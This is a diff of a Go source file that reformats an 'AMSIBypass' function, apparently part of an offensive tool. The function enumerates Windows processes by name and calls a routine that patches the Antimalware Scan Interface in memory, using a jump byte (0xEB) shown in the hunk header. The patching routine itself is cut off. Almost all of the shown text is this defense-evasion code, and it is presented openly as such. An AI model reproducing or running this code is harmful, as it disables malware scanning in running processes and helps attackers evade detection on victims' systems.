@@ -26,40 +26,40 @@ var patch = []byte{0xEB}
 
 // Bypasses AMSI 
 // processName: String which holds the name of the process to patch
-// Returns nothin (void)
+// Returns nothing (void)
 func AMSIBypass(processName string) {
-    snapshot, err := windows.CreateToolhelp32Snapshot(
-        windows.TH32CS_SNAPPROCESS, 0)
-        if err != nil {
-            fmt.Println("[!] Error creating snapshot:", err)
-            return
-        }
-        defer windows.CloseHandle(snapshot)
+	snapshot, err := windows.CreateToolhelp32Snapshot(
+		windows.TH32CS_SNAPPROCESS, 0)
+		if err != nil {
+			fmt.Println("[!] Error creating snapshot:", err)
+			return
+		}
+		defer windows.CloseHandle(snapshot)
 
-        var entry windows.ProcessEntry32
-        entry.Size = uint32(unsafe.Sizeof(entry))
+		var entry windows.ProcessEntry32
+		entry.Size = uint32(unsafe.Sizeof(entry))
 
-        err = windows.Process32First(snapshot, &entry)
-        if err != nil {
-            fmt.Println("[!] Error getting first process:", err)
-            return
-        }
+		err = windows.Process32First(snapshot, &entry)
+		if err != nil {
+			fmt.Println("[!] Error getting first process:", err)
+			return
+		}
 
-        for {
-            exeFile := windows.UTF16ToString(entry.ExeFile[:])
-            if exeFile == processName {
-                if bypassProcess(entry.ProcessID) {
-                    fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
-                } else {
-                    fmt.Println("[!] Patch failed")
-                }
-            }
-            err = windows.Process32Next(snapshot, &entry)
-            if err != nil {
-                break
-            }
-        }
-    }
+		for {
+			exeFile := windows.UTF16ToString(entry.ExeFile[:])
+			if exeFile == processName {
+				if bypassProcess(entry.ProcessID) {
+					fmt.Printf("[+] AMSI patched %d\n", entry.ProcessID)
+				} else {
+					fmt.Println("[!] Patch failed")
+				}
+			}
+			err = windows.Process32Next(snapshot, &entry)
+			if err != nil {
+				break
+			}
+		}
+}
 
 
     // Performs the actual bypass
